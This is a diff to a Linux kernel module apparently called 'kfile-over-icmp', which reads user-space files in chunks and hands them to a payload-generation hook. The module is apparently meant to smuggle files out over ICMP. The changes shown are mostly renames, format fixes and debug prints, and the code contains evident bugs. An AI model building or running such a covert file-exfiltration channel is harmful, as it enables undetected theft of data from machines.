@@ -1,9 +1,9 @@
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+
 #include "payload_generator.h"
 #include "file_metadata.h"
 #include "../chrdev/chrdev.h"
-
-#include <linux/fs.h>
-#include <linux/uaccess.h>
 
 static struct file_metadata current_file;
 
@@ -16,8 +16,6 @@ void initialize_file_metadata(struct file_metadata *current_file)
 
 void read_file_chunks(struct file_metadata *current_file)
 {
-    printk(KERN_DEBUG "kfile-over-icmp: in read_file_chunks\n");
-
     // open the file from user-space.
     // it is important to note that dealing with user-space files from the kernel is considered
     // to be a VERY bad practice. in this module we pretty much have to deal with files, but we
@@ -26,7 +24,7 @@ void read_file_chunks(struct file_metadata *current_file)
     struct file *filp;
     filp = filp_open(current_file->file_path, O_RDONLY, 0);
     if (IS_ERR(filp)) {
-        printk(KERN_ERR "kfile-over-icmp: failed to open file. error: %d\n", PTR_ERR(filp));
+        printk(KERN_ERR "kfile-over-icmp: failed to open file. error: %ld\n", PTR_ERR(filp));
         return;
     }
     
@@ -70,7 +68,7 @@ void read_file_chunks(struct file_metadata *current_file)
             is_first_chunk = false;
         }
 
-        ssize_t size_to_read = min(available_space_in_chunk, file_size - current_position);
+        ssize_t size_to_read = min(available_space_in_chunk, (size_t)(file_size - current_position));
 
         // read the file's content.
         // few important notes:
@@ -104,28 +102,29 @@ void process_next_pending_file(struct file_metadata *current_file)
     initialize_file_metadata(current_file);
     
     // check if there are pending files. if there isn't - return;
-    mutex_lock(&pending_files_to_be_sent_mutex);
-    bool is_list_empty = list_empty(&pending_files_to_be_sent);
-    mutex_unlock(&pending_files_to_be_sent_mutex);
+    mutex_lock(&g_pending_files_to_be_sent_mutex);
+    bool is_list_empty = list_empty(&g_pending_files_to_be_sent);
+    mutex_unlock(&g_pending_files_to_be_sent_mutex);
     if (is_list_empty) {
         return;    
     }
 
     // free the previous file path as we are going to process the next one.
     if (NULL != current_file->file_path) {
+        printk(KERN_DEBUG "kfile-over-icmp: successfully send file %pn\n", current_file->file_path);
         kfree(current_file->file_path);
     }
 
-    // acquire pending_files_to_be_sent mutex as we don't want anyone to mess
+    // acquire g_pending_files_to_be_sent mutex as we don't want anyone to mess
     // with our list while we are reading its head.
-    mutex_lock(&pending_files_to_be_sent_mutex);
+    mutex_lock(&g_pending_files_to_be_sent_mutex);
     struct file_metadata *next_pending_file;
-    next_pending_file = list_first_entry_or_null(&pending_files_to_be_sent, struct file_metadata, l_head);
+    next_pending_file = list_first_entry_or_null(&g_pending_files_to_be_sent, struct file_metadata, l_head);
     if (NULL == next_pending_file) {
         list_del(&next_pending_file->l_head);
         goto release_mutex;
     }
-    mutex_unlock(&pending_files_to_be_sent_mutex);
+    mutex_unlock(&g_pending_files_to_be_sent_mutex);
 
     // copy the file path
     size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
@@ -141,9 +140,9 @@ void process_next_pending_file(struct file_metadata *current_file)
 
     // remove the item from the list of pending files.
     // also, free it as we are responsible for its memory.
-    mutex_lock(&pending_files_to_be_sent_mutex);
+    mutex_lock(&g_pending_files_to_be_sent_mutex);
     list_del(&next_pending_file->l_head);
-    mutex_unlock(&pending_files_to_be_sent_mutex);
+    mutex_unlock(&g_pending_files_to_be_sent_mutex);
     kfree(next_pending_file->file_path);
     kfree(next_pending_file);
 
@@ -153,7 +152,7 @@ void process_next_pending_file(struct file_metadata *current_file)
     return;
 
 release_mutex:
-    mutex_unlock(&pending_files_to_be_sent_mutex);
+    mutex_unlock(&g_pending_files_to_be_sent_mutex);
 }
 
 int generate_payload(char *buffer, size_t *length)
@@ -194,7 +193,7 @@ int generate_payload(char *buffer, size_t *length)
 void setup_payload_generator(void)
 {
     // TODO: make atomic!
-    get_payload_func = &generate_payload;
+    g_get_payload_func = &generate_payload;
     initialize_file_metadata(&current_file);
 }
 
